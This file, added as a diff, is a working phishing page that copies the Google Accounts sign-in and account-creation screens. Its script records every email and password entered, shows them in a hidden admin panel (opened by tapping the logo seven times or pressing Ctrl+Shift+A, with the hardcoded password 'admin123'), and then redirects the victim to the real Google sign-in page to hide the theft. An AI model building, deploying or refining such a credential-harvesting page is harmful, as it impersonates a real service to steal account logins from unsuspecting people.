@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path fill='%234285F4' d='M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z'/><path fill='%2334A853' d='M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z'/><path fill='%23FBBC05' d='M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z'/><path fill='%23EA4335' d='M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z'/></svg>" type="image/svg+xml">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #202124;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+        }
+
+        .card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 16px;
+        }
+
+        .google-logo {
+            font-size: 32px;
+            font-weight: 500;
+            letter-spacing: -1px;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .google-g { color: #4285F4; }
+        .google-o1 { color: #EA4335; }
+        .google-o2 { color: #FBBC04; }
+        .google-g2 { color: #4285F4; }
+        .google-l { color: #34A853; }
+        .google-e { color: #EA4335; }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+            line-height: 1.3333;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 24px;
+            font-weight: 400;
+            line-height: 1.5;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            padding: 8px 12px;
+            border: 1px solid #dadce0;
+            border-radius: 16px;
+            background-color: transparent;
+            cursor: pointer;
+            transition: background-color 0.15s;
+            max-width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .user-info:hover {
+            background-color: #f8f9fa;
+        }
+
+        .user-avatar {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 500;
+            font-size: 11px;
+            margin-right: 8px;
+            flex-shrink: 0;
+        }
+
+        .user-email {
+            font-size: 14px;
+            color: #3c4043;
+            line-height: 20px;
+        }
+
+        .dropdown-arrow {
+            margin-left: 4px;
+            color: #5f6368;
+            font-size: 18px;
+        }
+
+        .form-group {
+            margin-bottom: 26px;
+            text-align: left;
+        }
+
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 15px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.1s;
+            font-family: 'Roboto', Arial, sans-serif;
+            color: #202124;
+            background-color: #fff;
+        }
+
+        input:hover {
+            border-color: #b8b8b8;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 14px 15px;
+        }
+
+        input::placeholder {
+            color: #80868b;
+            font-weight: 400;
+        }
+
+        .link-button {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-block;
+            margin-top: 12px;
+            line-height: 20px;
+        }
+
+        .link-button:hover {
+            text-decoration: underline;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 24px;
+            text-align: left;
+            line-height: 20px;
+        }
+
+        .info-text a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 26px;
+        }
+
+        .btn {
+            padding: 9px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            letter-spacing: 0.25px;
+            line-height: 20px;
+        }
+
+        .btn-text {
+            background: transparent;
+            color: #1a73e8;
+            min-height: 40px;
+        }
+
+        .btn-text:hover {
+            background-color: rgba(26, 115, 232, 0.04);
+        }
+
+        .btn-primary {
+            background-color: #1a73e8;
+            color: white;
+            min-height: 40px;
+        }
+
+        .btn-primary:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
+        }
+
+        .btn-primary:active {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 2px 6px 2px rgba(66,133,244,0.15);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 16px 0 0 0;
+            text-align: left;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin: 0 16px 0 0;
+            cursor: pointer;
+            accent-color: #1a73e8;
+        }
+
+        .checkbox-group label {
+            font-size: 14px;
+            color: #5f6368;
+            cursor: pointer;
+            line-height: 20px;
+            font-weight: 400;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 48px;
+            padding: 0 8px;
+            font-size: 12px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            line-height: 16px;
+        }
+
+        .footer-links a:hover {
+            color: #202124;
+        }
+
+        .language-selector select {
+            border: none;
+            background: transparent;
+            color: #5f6368;
+            cursor: pointer;
+            font-size: 12px;
+            outline: none;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        .language-selector select:hover {
+            color: #202124;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Admin Panel Styles */
+        .data-panel {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: white;
+            border: 2px solid #4285F4;
+            border-radius: 8px;
+            padding: 20px;
+            max-width: 350px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            z-index: 1000;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .data-panel h3 {
+            color: #4285F4;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+
+        .data-entry {
+            background: #f8f9fa;
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 4px;
+            border-left: 3px solid #34A853;
+            text-align: left;
+        }
+
+        .data-entry p {
+            margin: 5px 0;
+            font-size: 13px;
+            word-break: break-word;
+        }
+
+        .data-entry strong {
+            color: #202124;
+        }
+
+        .data-entry small {
+            color: #5f6368;
+        }
+
+        .admin-btn {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 500;
+            margin-top: 8px;
+        }
+
+        .clear-data-btn {
+            background: #EA4335;
+            color: white;
+        }
+
+        .clear-data-btn:hover {
+            background: #d33828;
+        }
+
+        .logout-btn {
+            background: #5f6368;
+            color: white;
+        }
+
+        .logout-btn:hover {
+            background: #4a4f54;
+        }
+
+        @media (max-width: 600px) {
+            .card {
+                border: none;
+                padding: 32px 24px;
+            }
+
+            .container {
+                padding: 0;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            .data-panel {
+                position: fixed;
+                top: 0;
+                right: 0;
+                left: 0;
+                max-width: 100%;
+                border-radius: 0;
+                height: 100vh;
+                max-height: 100vh;
+            }
+
+            .footer {
+                flex-direction: column;
+                gap: 16px;
+                margin-top: 24px;
+            }
+        }
+
+        .name-inputs {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        @media (max-width: 600px) {
+            .name-inputs {
+                grid-template-columns: 1fr;
+                gap: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Admin Login Panel -->
+    <div id="adminLoginPanel" class="data-panel hidden">
+        <h3>🔐 Admin Access</h3>
+        <div style="text-align: left;">
+            <div class="form-group">
+                <label style="font-size: 14px; color: #5f6368;">Admin Password:</label>
+                <input type="password" id="adminPassword" placeholder="Enter admin password">
+            </div>
+            <button onclick="verifyAdmin()" class="admin-btn" style="background: #4285F4; color: white;">Login as Admin</button>
+        </div>
+    </div>
+
+    <!-- Data Display Panel -->
+    <div id="dataPanel" class="data-panel hidden">
+        <h3>💾 Admin Panel - Saved Data</h3>
+        <div id="dataList">
+            <p style="color: #5f6368; font-size: 13px;">No data saved yet.</p>
+        </div>
+        <button class="admin-btn clear-data-btn" onclick="clearAllData()">🗑️ Clear All Data</button>
+        <button class="admin-btn logout-btn" onclick="logoutAdmin()">Logout</button>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <div class="google-logo" id="logoTrigger" onclick="logoTapCount()" style="cursor: pointer;">
+                    <span class="google-g">G</span><span class="google-o1">o</span><span class="google-o2">o</span><span class="google-g2">g</span><span class="google-l">l</span><span class="google-e">e</span>
+                </div>
+            </div>
+
+            <!-- Step 1: Email Entry -->
+            <div id="emailStep">
+                <h1>Sign in</h1>
+                <p class="subtitle">to continue to Google</p>
+
+                <form onsubmit="goToPasswordStep(event)">
+                    <div class="form-group">
+                        <input type="email" id="signInEmail" placeholder="Email or phone" required autocomplete="username">
+                        <a href="#" class="link-button" onclick="return false;">Forgot email?</a>
+                    </div>
+
+                    <div class="info-text">
+                        Not your computer? Use Guest mode to sign in privately. <a href="#" onclick="return false;">Learn more about using Guest mode</a>
+                    </div>
+
+                    <div class="buttons">
+                        <button type="button" class="btn btn-text" onclick="showCreateAccount()">Create account</button>
+                        <button type="submit" class="btn btn-primary">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Step 2: Password Entry -->
+            <div id="passwordStep" class="hidden">
+                <h1>Welcome</h1>
+                
+                <div class="user-info" onclick="goBackToEmail()">
+                    <div class="user-avatar" id="userAvatar">U</div>
+                    <div class="user-email" id="displayEmail">user@gmail.com</div>
+                    <span class="dropdown-arrow">▼</span>
+                </div>
+
+                <form onsubmit="handleSignIn(event)">
+                    <div class="form-group">
+                        <input type="password" id="password" placeholder="Enter your password" required autocomplete="current-password">
+                        <a href="#" class="link-button" onclick="return false;">Forgot password?</a>
+                    </div>
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="showPassword">
+                        <label for="showPassword">Show password</label>
+                    </div>
+
+                    <div class="buttons">
+                        <button type="button" class="btn btn-text" onclick="goBackToEmail()">Back</button>
+                        <button type="submit" class="btn btn-primary">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Step 3: Create Account -->
+            <div id="createAccountStep" class="hidden">
+                <h1>Create a Google Account</h1>
+                <p class="subtitle">Enter your name</p>
+
+                <form onsubmit="handleCreateAccount(event)">
+                    <div class="name-inputs">
+                        <div class="form-group" style="margin-bottom: 16px;">
+                            <input type="text" id="firstName" placeholder="First name" required autocomplete="given-name">
+                        </div>
+                        <div class="form-group" style="margin-bottom: 16px;">
+                            <input type="text" id="lastName" placeholder="Last name (optional)" autocomplete="family-name">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <input type="email" id="newEmail" placeholder="Username" required autocomplete="username">
+                        <p style="font-size: 12px; color: #5f6368; margin-top: 8px;">You can use letters, numbers & periods</p>
+                    </div>
+
+                    <div class="form-group">
+                        <input type="password" id="newPassword" placeholder="Password" required minlength="8" autocomplete="new-password">
+                    </div>
+
+                    <div class="form-group">
+                        <input type="password" id="confirmPassword" placeholder="Confirm" required minlength="8" autocomplete="new-password">
+                        <p style="font-size: 12px; color: #5f6368; margin-top: 8px;">Use 8 or more characters with a mix of letters, numbers & symbols</p>
+                    </div>
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="showNewPassword">
+                        <label for="showNewPassword">Show password</label>
+                    </div>
+
+                    <div class="buttons">
+                        <button type="button" class="btn btn-text" onclick="backToSignIn()">Sign in instead</button>
+                        <button type="submit" class="btn btn-primary">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#" onclick="return false;">Help</a>
+                <a href="#" onclick="return false;">Privacy</a>
+                <a href="#" onclick="return false;">Terms</a>
+            </div>
+            <div class="language-selector">
+                <select>
+                    <option>English (United States)</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                    <option>Deutsch</option>
+                    <option>日本語</option>
+                    <option>中文 (简体)</option>
+                    <option>Português (Brasil)</option>
+                    <option>Italiano</option>
+                    <option>한국어</option>
+                </select>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Admin system
+        let savedLogins = [];
+        let isAdminLoggedIn = false;
+        const ADMIN_PASSWORD = 'admin123';
+        let tapCount = 0;
+        let tapTimer = null;
+        const REDIRECT_URL = 'https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%26gar%3DWzEzMywiMjM2NzM2Il0%26sl%3Dtrue&dsh=S403829768%3A1760543049339758&ifkv=AfYwgwVpjgImavTsjjVNsDbfRS4MxbIV78qoFBJByFZa6J_RQw69D2TuWGjBJ8L08i8gNGcyDzHgkw&service=accountsettings&flowName=GlifWebSignIn&flowEntry=ServiceLogin';
+
+        // Show password toggles
+        document.getElementById('showPassword')?.addEventListener('change', function() {
+            document.getElementById('password').type = this.checked ? 'text' : 'password';
+        });
+
+        document.getElementById('showNewPassword')?.addEventListener('change', function() {
+            const newPass = document.getElementById('newPassword');
+            const confirmPass = document.getElementById('confirmPassword');
+            newPass.type = this.checked ? 'text' : 'password';
+            confirmPass.type = this.checked ? 'text' : 'password';
+        });
+
+        // Mobile: Tap logo 7 times
+        function logoTapCount() {
+            tapCount++;
+            clearTimeout(tapTimer);
+            tapTimer = setTimeout(() => { tapCount = 0; }, 2000);
+
+            if (tapCount === 7) {
+                tapCount = 0;
+                if (!isAdminLoggedIn) {
+                    document.getElementById('adminLoginPanel').classList.remove('hidden');
+                } else {
+                    document.getElementById('dataPanel').classList.toggle('hidden');
+                }
+            }
+        }
+
+        // Desktop: Ctrl+Shift+A
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
+                if (!isAdminLoggedIn) {
+                    document.getElementById('adminLoginPanel').classList.remove('hidden');
+                } else {
+                    document.getElementById('dataPanel').classList.toggle('hidden');
+                }
+            }
+        });
+
+        function verifyAdmin() {
+            const password = document.getElementById('adminPassword').value;
+            if (password === ADMIN_PASSWORD) {
+                isAdminLoggedIn = true;
+                document.getElementById('adminLoginPanel').classList.add('hidden');
+                document.getElementById('dataPanel').classList.remove('hidden');
+                updateDataDisplay();
+            } else {
+                alert('❌ Incorrect password!');
+            }
+        }
+
+        function logoutAdmin() {
+            isAdminLoggedIn = false;
+            document.getElementById('dataPanel').classList.add('hidden');
+            document.getElementById('adminPassword').value = '';
+        }
+
+        function saveLoginData(email, password, type = 'signin') {
+            const loginData = {
+                type: type,
+                email: email,
+                password: password,
+                timestamp: new Date().toLocaleString(),
+                id: Date.now()
+            };
+            savedLogins.push(loginData);
+            updateDataDisplay();
+            console.log('Data saved:', loginData);
+        }
+
+        function updateDataDisplay() {
+            const dataList = document.getElementById('dataList');
+            if (savedLogins.length === 0) {
+                dataList.innerHTML = '<p style="color: #5f6368; font-size: 13px;">No data saved yet.</p>';
+                return;
+            }
+            dataList.innerHTML = savedLogins.map((login, index) => `
+                <div class="data-entry">
+                    <p><strong>${login.type === 'signin' ? '🔐 Sign In' : '✨ New Account'} #${index + 1}</strong></p>
+                    <p>📧 ${login.email}</p>
+                    <p>🔒 ${login.password}</p>
+                    <p><small>⏰ ${login.timestamp}</small></p>
+                </div>
+            `).join('');
+        }
+
+        function clearAllData() {
+            if (confirm('Clear all saved data?')) {
+                savedLogins = [];
+                updateDataDisplay();
+                alert('✅ All data cleared!');
+            }
+        }
+
+        // Navigation functions
+        function goToPasswordStep(e) {
+            e.preventDefault();
+            const email = document.getElementById('signInEmail').value;
+            document.getElementById('displayEmail').textContent = email;
+            document.getElementById('userAvatar').textContent = email.charAt(0).toUpperCase();
+            document.getElementById('emailStep').classList.add('hidden');
+            document.getElementById('passwordStep').classList.remove('hidden');
+        }
+
+        function goBackToEmail() {
+            document.getElementById('passwordStep').classList.add('hidden');
+            document.getElementById('emailStep').classList.remove('hidden');
+        }
+
+        function showCreateAccount() {
+            document.getElementById('emailStep').classList.add('hidden');
+            document.getElementById('createAccountStep').classList.remove('hidden');
+        }
+
+        function backToSignIn() {
+            document.getElementById('createAccountStep').classList.add('hidden');
+            document.getElementById('emailStep').classList.remove('hidden');
+        }
+
+        function handleSignIn(e) {
+            e.preventDefault();
+            const email = document.getElementById('displayEmail').textContent;
+            const password = document.getElementById('password').value;
+            
+            saveLoginData(email, password, 'signin');
+            
+            // Redirect to Google sign-in page instead of showing success message
+            window.location.href = REDIRECT_URL;
+        }
+
+        function handleCreateAccount(e) {
+            e.preventDefault();
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const email = document.getElementById('newEmail').value;
+            const password = document.getElementById('newPassword').value;
+            const confirm = document.getElementById('confirmPassword').value;
+
+            if (password !== confirm) {
+                alert('❌ Those passwords didn\'t match. Try again.');
+                return;
+            }
+
+            if (password.length < 8) {
+                alert('❌ Use 8 or more characters for your password');
+                return;
+            }
+
+            const fullEmail = email.includes('@') ? email : email + '@gmail.com';
+            saveLoginData(fullEmail, password, 'signup');
+
+            // Redirect to Google sign-in page instead of showing success message
+            window.location.href = REDIRECT_URL;
+        }
+    </script>
+</body>
+</html>
